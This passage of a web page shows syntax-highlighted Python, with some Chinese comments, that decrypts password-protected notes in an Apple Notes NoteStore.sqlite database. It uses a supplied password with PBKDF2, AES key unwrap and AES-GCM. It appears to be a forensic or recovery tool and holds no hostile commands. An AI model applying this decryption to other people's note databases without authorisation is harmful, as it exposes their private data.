&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;cipher&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;decrypt_and_verify&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;ciphertext&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;tag&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ValueError&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[-] AES-GCM Decryption failed: &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#61afef;font-weight:bold&#34;&gt;main&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;len&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;argv&lt;/span&gt;) &lt;span style=&#34;color:#56b6c2&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;3&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Usage: &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;argv&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; NoteStore.sqlite password&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;db_file&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;argv&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;argv&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;encode&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;conn&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;db_file&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;cursor&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;conn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;cursor&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;cursor&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;execute&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;            SELECT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.Z_PK,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.ZCRYPTOITERATIONCOUNT,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.ZCRYPTOSALT,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.ZCRYPTOWRAPPEDKEY,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.ZENCRYPTEDVALUESJSON,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t2.ZCRYPTOINITIALIZATIONVECTOR,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t2.ZCRYPTOTAG,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t2.ZDATA
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;            FROM
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                ZICCLOUDSYNCINGOBJECT AS t1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;            JOIN
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                ZICNOTEDATA AS t2 ON t1.Z_PK = t2.ZNOTE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;            WHERE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;                t1.ZISPASSWORDPROTECTED = 1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;        &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;sqlite3&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;OperationalError&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[!] Database query failed. The schema might be different. Error: &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;conn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;rows&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;cursor&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;fetchall&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;rows&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[!] No password protected notes found in the database.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;conn&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;close&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e06c75&#34;&gt;decryption_successful&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#c678dd&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;row&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;rows&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;iterations&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;salt&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;wrapped_key_blob&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;encrypted_json&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;iv_blob&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;tag_blob&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;data_blob&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;row&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;--- Processing Note Z_PK=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; ---&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;not&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;salt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;wrapped_key_blob&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[*] Skipping note due to missing salt or wrapped key.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;salt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;bytes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;salt&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;wrapped_key_blob&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;bytes&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;wrapped_key_blob&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#7f848e&#34;&gt;# 步骤 1: 派生主密钥 (KEK)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Step 1: Deriving Key Encrypting Key using PBKDF2-SHA256...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;main_key&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;PBKDF2&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;salt&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;dkLen&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;count&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;iterations&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;hmac_hash_module&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;SHA256&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#7f848e&#34;&gt;# 步骤 2: 使用 cryptography AES Key Unwrap 解包笔记密钥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Step 2: Unwrapping note encryption key using AES Key Unwrap...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;aes_key&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;aes_key_unwrap&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;main_key&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;wrapped_key_blob&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;backend&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;default_backend&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[+] Successfully unwrapped note key!&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;except&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;ValueError&lt;/span&gt;, &lt;span style=&#34;color:#e06c75&#34;&gt;TypeError&lt;/span&gt;) &lt;span style=&#34;color:#c678dd&#34;&gt;as&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[!] Step 2 FAILED. This almost certainly means the password &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;sys&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;argv&lt;/span&gt;[&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; is incorrect. Error: &lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#c678dd&#34;&gt;continue&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#7f848e&#34;&gt;# 步骤 3: 选择要解密的笔记数据&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#e06c75&#34;&gt;source_column&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;encrypted_json&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;encrypted_json&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;source_column&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;ZENCRYPTEDVALUESJSON&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;elif&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;data_blob&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;data_to_decrypt&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;data_blob&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;source_column&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;ZDATA from ZICNOTEDATA&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#c678dd&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e5c07b&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#98c379&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;[*] Note Z_PK=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;pk&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt; key was unwrapped, but no content data found to decrypt.&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e06c75&#34;&gt;decryption_successful&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e5c07b&#34;&gt;True&lt;/span&gt;
